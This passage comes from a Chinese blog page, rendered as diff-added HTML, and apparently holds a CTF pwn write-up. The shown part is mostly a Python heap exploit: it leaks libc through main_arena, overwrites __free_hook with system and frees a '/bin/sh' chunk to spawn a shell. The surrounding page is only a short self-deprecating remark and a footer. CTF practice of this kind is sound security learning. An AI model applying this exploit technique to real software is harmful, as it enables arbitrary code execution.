add_s("c1","s1")#0x30</span></span><br><span class="line"><span class="comment"># add_t("s0",0x18,"0"*0x18)</span></span><br><span class="line"><span class="comment"># add_t("s1",0x60,"1"*0x60)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">add_c("c2")</span></span><br><span class="line"><span class="string">add_s("c2","s2")</span></span><br><span class="line"><span class="string">add_t("s2",0x18,"2"*0x18)</span></span><br><span class="line"><span class="string">add_c("c3")</span></span><br><span class="line"><span class="string">add_s("c3","s3")</span></span><br><span class="line"><span class="string">add_t("s3",0x60,"3"*0x60)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">del_c("c3")</span></span><br><span class="line"><span class="string">del_t("s2")</span></span><br><span class="line"><span class="string">add_t("s2",0x18,"2"*0x20)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">add_c(<span class="string">"c2"</span>)</span><br><span class="line">add_c(<span class="string">"c3"</span>)</span><br><span class="line">add_s(<span class="string">"c2"</span>,<span class="string">"s2"</span>)</span><br><span class="line">add_s(<span class="string">"c3"</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add_t(<span class="string">"s2"</span>,<span class="number">0x18</span>,<span class="string">"2"</span>*<span class="number">0x18</span>)</span><br><span class="line">add_t(<span class="string">"/bin/sh\x00"</span>,<span class="number">0x68</span>,<span class="string">"3"</span>*<span class="number">68</span>)</span><br><span class="line">add_c(<span class="string">"c4"</span>)</span><br><span class="line">add_s(<span class="string">"c4"</span>,<span class="string">"s4"</span>)</span><br><span class="line">del_c(<span class="string">"c4"</span>)</span><br><span class="line">del_t(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add_t(<span class="string">"/bin/sh\x00"</span>,<span class="number">0x68</span>,<span class="string">"3"</span>*<span class="number">0x70</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc </span></span><br><span class="line">r.recvuntil(<span class="string">"3"</span>*<span class="number">0x70</span>)</span><br><span class="line">main_arena_88 = u64(rud(<span class="string">"\x0a"</span>)+<span class="string">"\x00\x00"</span>)</span><br><span class="line">li(<span class="string">"main_arena_88"</span>,main_arena_88)</span><br><span class="line">base_addr = main_arena_88<span class="number">-88</span><span class="number">-0x10</span>-libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">li(<span class="string">"base_addr"</span>,base_addr)</span><br><span class="line">__free_hook = base_addr+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">pay_1 =<span class="string">"2"</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+<span class="string">"3"</span>*<span class="number">0x68</span>+p64(<span class="number">0x91</span>)+p64(main_arena_88)+p64(__free_hook<span class="number">-0x40</span><span class="number">-0x10</span>)+p64(<span class="number">0x0</span>)*<span class="number">14</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x40</span>)+p64(<span class="number">0x0</span>)*<span class="number">5</span>+p64(<span class="number">0x20</span>)</span><br><span class="line">update(<span class="string">"Text"</span>,<span class="string">"s2"</span>,pay_1)</span><br><span class="line">del_t(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add_c(<span class="string">"c5"</span>)</span><br><span class="line">pay_2 = <span class="string">"2"</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+p64(__free_hook - <span class="number">0x43</span>) * <span class="number">2</span>+<span class="string">"3"</span>*<span class="number">0x58</span>+p64(<span class="number">0x91</span>)+p64(<span class="number">0x0000000000003563</span>)</span><br><span class="line">update(<span class="string">"Text"</span>,<span class="string">"s2"</span>,pay_2)</span><br><span class="line">add_t(<span class="string">"s2"</span>,<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]+base_addr</span><br><span class="line">one_gg = <span class="number">0x45215</span>+base_addr</span><br><span class="line">pay_2 = <span class="string">"\x00"</span>*<span class="number">3</span></span><br><span class="line">pay_2+=<span class="string">"\x00"</span>*<span class="number">0x30</span>+p64(system_addr)</span><br><span class="line">add_t(<span class="string">"s2"</span>,<span class="number">0x68</span>,<span class="string">"\n"</span>)</span><br><span class="line">update(<span class="string">"Text"</span>,<span class="string">"s2"</span>,pay_2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add_c("c6")</span></span><br><span class="line">del_s(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="comment"># r.recv()</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">raw_input()</span><br><span class="line">ri()</span><br></pre></td></tr></table></figure></p>
+<p>哎 发现自己做堆题还是菜的一逼！</p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
